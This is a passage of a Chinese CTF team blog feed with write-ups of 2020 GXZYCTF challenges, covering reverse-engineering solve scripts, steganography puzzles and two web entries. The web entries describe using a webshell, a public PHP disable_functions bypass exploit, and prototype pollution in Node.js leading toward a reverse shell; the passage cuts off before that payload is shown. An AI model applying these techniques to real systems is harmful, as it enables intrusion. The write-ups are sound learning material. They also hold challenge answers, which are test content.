      &lt;p&gt;题目在比赛的时候没做出来，赛后复盘发现硬件断点下错了，梳理逻辑后发现很简单。&lt;br&gt;&lt;strong&gt;第一层考点：下准断点&lt;/strong&gt;&lt;br&gt;这是一个rust编译的程序，因此可读性较差，先找到输出对输出函数下断点&lt;br&gt;_$LT$std..io..stdio..Stdin$u20$as$u20$std..io..Read$GT$::read::h174af29f99bd8aef&lt;br&gt;每次执行这个函数都是从缓冲区读入一个字节，当所有字节都读完之后再一个一个字节验证，很容易联想到pintools爆破求解&lt;br&gt;但稍微耐心点调试发现加密过程很简单&lt;br&gt;密文是程序执行过程中生成的也需要dump&lt;br&gt;解密脚本如下&lt;/p&gt;
&lt;figure class=&quot;highlight angelscript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;result = [&lt;span class=&quot;number&quot;&gt;144&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;332&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;132&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;64&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;64&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;208&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;88&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;44&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;52&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;276&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;44&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;52&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;144&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;68&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;48&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;92&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;44&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;264&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;flag=&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; result:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; c &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((c^&lt;span class=&quot;number&quot;&gt;0x63&lt;/span&gt;)&amp;lt;&amp;lt;(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&amp;amp;&lt;span class=&quot;number&quot;&gt;0x3f&lt;/span&gt;)==i):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			flag+=chr(c)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print flag&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="Re_VM" scheme="https://boiteam.github.io/tags/Re-VM/"/>
    
      <category term="Re_rust编译" scheme="https://boiteam.github.io/tags/Re-rust%E7%BC%96%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF !ftcx</title>
    <link href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_fxck!/"/>
    <id>https://boiteam.github.io/2020/03/20/2020_GXZCTF_fxck!/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-03-21T13:13:29.899Z</updated>
    
    <content type="html"><![CDATA[<p>密文生成和加密运算是两个不同<br>密文是通过一系列加密运算直接生成的，dump出来就能用<br><strong>第一层考点：魔改base58</strong><br>里面稍微加了点混淆，且表也改了，因此不太容易看出这是base58的算法，但有一个显著的特征，他总是在在进行%58操作，因此通过这一特征也可以联想到base58<br>附魔改base58脚本</p><p><img src="/2020/03/20/2020_GXZCTF_fxck!/image-20200321203901085.png" alt="image-20200321203901085"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;密文生成和加密运算是两个不同&lt;br&gt;密文是通过一系列加密运算直接生成的，dump出来就能用&lt;br&gt;&lt;strong&gt;第一层考点：魔改base58&lt;/strong&gt;&lt;br&gt;里面稍微加了点混淆，且表也改了，因此不太容易看出这是base58的算法，但有一个显著的特征，他总是在在进行%58操作，因此通过这一特征也可以联想到base58&lt;br&gt;附魔改base58脚本&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/20/2020_GXZCTF_fxck!/image-20200321203901085.png&quot; alt=&quot;image-20200321203901085&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="Re_算法求解" scheme="https://boiteam.github.io/tags/Re-%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF 天津垓</title>
    <link href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_%E5%A4%A9%E6%B4%A5%E5%9E%93/"/>
    <id>https://boiteam.github.io/2020/03/20/2020_GXZCTF_%E5%A4%A9%E6%B4%A5%E5%9E%93/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-03-21T13:10:41.274Z</updated>
    
    <content type="html"><![CDATA[<p>有两层加密，第一次的正确作为smc解密的密钥<br><strong>第一层考点：去反调试</strong><br>64位的程序发现有反调试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 sub_10040162B()</span><br><span class="line">&#123;</span><br><span class="line">  _BOOL8 result; <span class="regexp">//</span> rax</span><br><span class="line"></span><br><span class="line">  result = sub_100401195();</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现有反调试直接nop掉<br><strong>第二层考点：算法求解</strong><br>找到关键算法后直接爆破</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char <span class="type">key</span>[] = <span class="string">"Rising_Hopper!"</span>;</span><br><span class="line">int result[] = &#123; <span class="number">17</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">20</span>,<span class="number">42</span>,<span class="number">59</span>,<span class="number">47</span>,<span class="number">3</span>,<span class="number">47</span>,<span class="number">4</span>,<span class="number">16</span>,<span class="number">72</span>,<span class="number">62</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">16</span> &#125;;</span><br><span class="line">char flag;</span><br><span class="line">for (int i = <span class="number">0</span>; i &lt;= <span class="number">17</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">for (flag = <span class="number">0x20</span>; flag &lt;= <span class="number">0x7e</span>; flag++)</span><br><span class="line">&#123;</span><br><span class="line">if ((~(flag &amp; <span class="type">key</span>[i % <span class="number">14</span>]) &amp; (flag | <span class="type">key</span>[i % <span class="number">14</span>])) == result[i])</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"%c"</span>,flag);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Caucasus@s_ability<br><strong>第三层考点：smc</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">lpAddress = a1;</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v8 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( strlen(Str) != <span class="number">18</span> )</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !VirtualProtect(lpAddress, v7, <span class="number">0</span>x40u, &amp;flOldProtect) )</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">    *((_BYTE *)lpAddress + i) ^= *(_BYTE *)(i % <span class="number">18</span> + v8);</span><br><span class="line">  result = VirtualProtect(lpAddress, v7, flOldProtect, &amp;flOldProtect);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure><p>这是利用第一层密文对代码进行加密，执行完后dump出内存，重新利用IDAf5便可找到关键算法</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">int</span> result[]=&#123;<span class="number">0x1EA272</span>,<span class="number">0x206FC4</span>,<span class="number">0x1D2203</span>,<span class="number">0x1EEF55</span>,<span class="number">0x24F111</span>,<span class="number">0x193A7C</span>,<span class="number">0x1F3C38</span>,<span class="number">0x21566D</span>,<span class="number">0x2323BF</span>,<span class="number">0x2289F9</span>,<span class="number">0x1D2203</span>,<span class="number">0x21098A</span>,<span class="number">0x1E08AC</span>,<span class="number">0x223D16</span>,<span class="number">0x1F891B</span>,<span class="number">0x2370A2</span>,<span class="number">0x1E558F</span>,<span class="number">0x223D16</span>,<span class="number">0x1C883D</span>,<span class="number">0x1F891B</span>,<span class="number">0x2289F9</span>,<span class="number">0x1C883D</span>,<span class="number">0xEB773</span>,<span class="number">0xE6A90</span>,<span class="number">0xE6A90</span>,<span class="number">0xE6A90</span>,<span class="number">0xB1CCF</span>,<span class="number">0x1C883D</span>,<span class="number">0x2289F9</span>,<span class="number">0x22D6DC</span>,<span class="number">0x223D16</span>,<span class="number">0x21566D</span>,<span class="number">0x21098A</span>,<span class="number">0x1EEF55</span>,<span class="number">0x1E558F</span>,<span class="number">0x223D16</span>,<span class="number">0x1C883D</span>,<span class="number">0x22D6DC</span>,<span class="number">0x1F3C38</span>,<span class="number">0x1D2203</span>,<span class="number">0x21098A</span>,<span class="number">0x1C883D</span>,<span class="number">0x24A42E</span>,<span class="number">0x1E558F</span>,<span class="number">0x223D16</span>,<span class="number">0x21566D</span>,<span class="number">0xD83E7</span>,<span class="number">0x21566D</span>,<span class="number">0x21098A</span>,<span class="number">0x1E558F</span>,<span class="number">0x258AD7</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">51</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0x20</span>; j &lt;= <span class="number">0x7e</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0x4ce3</span> *j % (unsigned <span class="built_in">int</span>)<span class="number">0x8000000B</span> == result[i])</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"%c"</span>,j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">flag&#123;Thousandriver_is_1000%_stronger_than_zero-one&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有两层加密，第一次的正确作为smc解密的密钥&lt;br&gt;&lt;strong&gt;第一层考点：去反调试&lt;/strong&gt;&lt;br&gt;64位的程序发现有反调试&lt;/p&gt;
&lt;figure class=&quot;highlight awk&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;_BOOL8 sub_10040162B()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  _BOOL8 result; &lt;span class=&quot;regexp&quot;&gt;//&lt;/span&gt; rax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  result = sub_100401195();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( (_DWORD)result )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return result;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="Re_算法求解" scheme="https://boiteam.github.io/tags/Re-%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3/"/>
    
      <category term="Re_反调试" scheme="https://boiteam.github.io/tags/Re-%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
      <category term="Re_smc" scheme="https://boiteam.github.io/tags/Re-smc/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF ez_mem&amp;usb</title>
    <link href="https://boiteam.github.io/2020/03/17/2020_GXZCTF_ez_mem&amp;usb/"/>
    <id>https://boiteam.github.io/2020/03/17/2020_GXZCTF_ez_mem&amp;usb/</id>
    <published>2020-03-17T05:54:17.000Z</published>
    <updated>2020-03-21T12:00:30.686Z</updated>
    
    <content type="html"><![CDATA[<p>Binwalk分离出一个压缩包，解开得data.vmem文件</p><p>Volatility分析</p><p>得到flag.img文件</p><p><img src="/2020/03/17/2020_GXZCTF_ez_mem&usb/clip_image002.jpg" alt="微信图片_20200321005339"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Binwalk分离出一个压缩包，解开得data.vmem文件&lt;/p&gt;
&lt;p&gt;Volatility分析&lt;/p&gt;
    
    </summary>
    
    
      <category term="Misc" scheme="https://boiteam.github.io/categories/Misc/"/>
    
    
      <category term="Misc_隐写" scheme="https://boiteam.github.io/tags/Misc-%E9%9A%90%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF 武汉加油</title>
    <link href="https://boiteam.github.io/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/"/>
    <id>https://boiteam.github.io/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/</id>
    <published>2020-03-17T05:54:17.000Z</published>
    <updated>2020-03-21T13:04:53.518Z</updated>
    
    <content type="html"><![CDATA[<p>binwalk分析一下</p><p><img src="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/image-20200321202605726.png" alt="image-20200321202605726"></p><p>存在图片和一个rar压缩包，提取压缩包，里面是一个flag.exe的执行文件，打开后尝试输入发现，每输入六行就会返回一串字符串，猜测应该是需要输入特定的六个字符会返回flag；</p><p>使用steghide工具对图片进行分析</p><p><img src="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/clip_image004.jpg" alt="IMG_256"></p><p>发现确实存在隐藏信息，但是需要密码，爆破~！</p><p>密码是“ctf”</p><p>得到flag.txt</p><p><img src="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/clip_image006-1584793461286.jpg" alt="IMG_256"></p><p>打开flag.exe</p><p>输入“ ‘ 武 汉 加 油 ! ”得到flag</p><p><img src="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/clip_image008.jpg" alt="IMG_257"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;binwalk分析一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/image-20200321202605726.png&quot; alt=&quot;image-20200321202605726&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Misc" scheme="https://boiteam.github.io/categories/Misc/"/>
    
    
      <category term="Misc_代码分析" scheme="https://boiteam.github.io/tags/Misc-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF 隐藏的信息</title>
    <link href="https://boiteam.github.io/2020/03/17/2020_GXZCTF_%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/"/>
    <id>https://boiteam.github.io/2020/03/17/2020_GXZCTF_%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/</id>
    <published>2020-03-17T05:54:17.000Z</published>
    <updated>2020-03-22T04:05:30.643Z</updated>
    
    <content type="html"><![CDATA[<p>二维码补全</p><p><img src="/2020/03/17/2020_GXZCTF_%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/clip_image002.gif" alt="IMG_256"></p><p>不是flag</p><p><img src="/2020/03/17/2020_GXZCTF_%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/clip_image004.gif" alt="IMG_256"></p><p>zip伪加密，解得⼀个wav</p><p>audacity打开频谱图，分析前后两段DTMF码：</p><p><img src="/2020/03/17/2020_GXZCTF_%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/clip_image006.jpg" alt="IMG_256"></p><p>得：187485618512，最后base64编码提交</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;二维码补全&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/17/2020_GXZCTF_%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/clip_image002.gif&quot; alt=&quot;IMG_256&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Misc" scheme="https://boiteam.github.io/categories/Misc/"/>
    
    
      <category term="Misc_隐写" scheme="https://boiteam.github.io/tags/Misc-%E9%9A%90%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF 简单misc</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZCTF_%E7%AE%80%E5%8D%95misc/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZCTF_%E7%AE%80%E5%8D%95misc/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T12:18:36.074Z</updated>
    
    <content type="html"><![CDATA[<p>photo.jpg隐写了一个压缩包，解开有一个ctf.txt文档</p><p>./.–./../-.././–/../-.-./…/../-/..-/.-/-/../—/-./—/..-./..-/-./../…-/./.-./…/../-/-.–/.–/.-/.-.</p><p>摩斯电码解密得压缩包密码：EPIDEMICSITUATIONOFUNIVERSITYWAR</p><p>压缩包解开得flag.txt：VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=</p><p>BASE64解密得flag:Th1s_is_FlaG_you_aRE_rigHT</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;photo.jpg隐写了一个压缩包，解开有一个ctf.txt文档&lt;/p&gt;
&lt;p&gt;./.–./../-.././–/../-.-./…/../-/..-/.-/-/../—/-./—/..-./..-/-./../…-/./.-./…/../-/-.–/.–/.-/.-.&lt;/p&gt;
    
    </summary>
    
    
      <category term="Misc" scheme="https://boiteam.github.io/categories/Misc/"/>
    
    
      <category term="Misc_隐写" scheme="https://boiteam.github.io/tags/Misc-%E9%9A%90%E5%86%99/"/>
    
      <category term="Misc_密码学" scheme="https://boiteam.github.io/tags/Misc-%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF PHP_UAF</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_PHP_UAF/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_PHP_UAF/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T12:27:28.927Z</updated>
    
    <content type="html"><![CDATA[<p>进去之后可以看到是个一句话</p><p><img src="/2020/03/09/2020_GXZYCTF_PHP_UAF/1584755208667.png" alt="1584755208667"></p><p>我们看一下 phpinfo</p><p><img src="/2020/03/09/2020_GXZYCTF_PHP_UAF/1584755250519.png" alt="1584755250519"></p><p>可以看到很先进, 是 php7.4.2, 蚁剑上去先, 由于 php 版本的问题, 我们以前的很多绕过<code>disable_functions</code>的方法都不能用</p><p><img src="/2020/03/09/2020_GXZYCTF_PHP_UAF/1584755311989.png" alt="1584755311989"></p><p>但是我们搜一下, 会发现有一个 uaf 洞还可以用</p><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><p>蚁剑上传, 然后在首页包含, <code>cat /flag</code>即可</p><p><img src="/2020/03/09/2020_GXZYCTF_PHP_UAF/1584755279048.png" alt="1584755279048"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;进去之后可以看到是个一句话&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/09/2020_GXZYCTF_PHP_UAF/1584755208667.png&quot; alt=&quot;1584755208667&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="PHP" scheme="https://boiteam.github.io/categories/Web/PHP/"/>
    
    
      <category term="Web_bypass-disabled-function" scheme="https://boiteam.github.io/tags/Web-bypass-disabled-function/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF GuessGame</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_GuessGame/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_GuessGame/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T11:31:30.800Z</updated>
    
    <content type="html"><![CDATA[<p>看到log函数里面有merge，那么可以原型链污染了</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">function <span class="keyword">log</span>(<span class="keyword">user</span>Info)&#123;</span><br><span class="line">    let <span class="keyword">log</span>Item = &#123;<span class="string">"time"</span>:new Date().<span class="keyword">to</span>String()&#125;;</span><br><span class="line">    merge(<span class="keyword">log</span>Item,<span class="keyword">user</span>Info);</span><br><span class="line">    loginHistory.push(<span class="keyword">log</span>Item);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后post/路由中调用了log</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//So terrible code~</span><br><span class="line">app.post(<span class="string">'/'</span>,<span class="keyword">function</span> (req, res) &#123;</span><br><span class="line">    <span class="keyword">if</span>(typeof req.body.<span class="keyword">user</span>.username != "string")&#123;</span><br><span class="line">        res.<span class="keyword">end</span>("error");</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        //console.log(req.body.<span class="keyword">user</span>.username);</span><br><span class="line">        <span class="keyword">if</span>(config.forbidAdmin &amp;&amp; req.body.<span class="keyword">user</span>.username.includes("admin"))&#123;</span><br><span class="line">            res.<span class="keyword">end</span>("any admin user has been baned");</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(req.body.<span class="keyword">user</span>.username.toUpperCase() === adminName.toUpperCase())</span><br><span class="line">                //<span class="keyword">only</span> <span class="keyword">log</span> <span class="keyword">admin</span><span class="string">'s activity</span></span><br><span class="line"><span class="string">                log(req.body.user);</span></span><br><span class="line"><span class="string">            res.end("ok");</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br></pre></td></tr></table></figure><p>需要满足输入的username的大写要等于 “admin888”的大写，利用javascript的大小写特性，就可以绕过，然后试了试之前ejs模板的反弹shell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 